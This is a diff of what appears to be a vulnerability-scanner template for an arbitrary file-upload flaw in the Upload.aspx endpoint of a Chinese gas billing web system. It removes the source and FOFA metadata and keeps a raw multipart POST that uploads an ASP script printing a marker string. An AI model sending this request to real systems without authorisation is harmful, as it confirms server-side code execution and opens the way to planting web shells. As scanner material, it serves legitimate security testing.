@@ -3,12 +3,8 @@ info:
   name: 先锋WEB燃气收费系统 Upload.aspx 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rv371qrsz9lozxfx'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rv371qrsz9lozxfx
-    fofa: app="先锋WEB燃气收费系统"
 http:
 - raw:
   - 'POST /AjaxService/Upload.aspx HTTP/1.1
@@ -29,8 +25,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-
-
     ------------GFioQpMK0vv2
 
 
@@ -40,8 +34,6 @@ http:
     Content-Type: application/octet-stream
 
 
-
-
     <% Response.Write("dudesuite") %>
 
 
@@ -49,8 +41,6 @@ http:
 
 
     Content-Disposition: form-data; name="submit"
-
-
 
 
     Submin
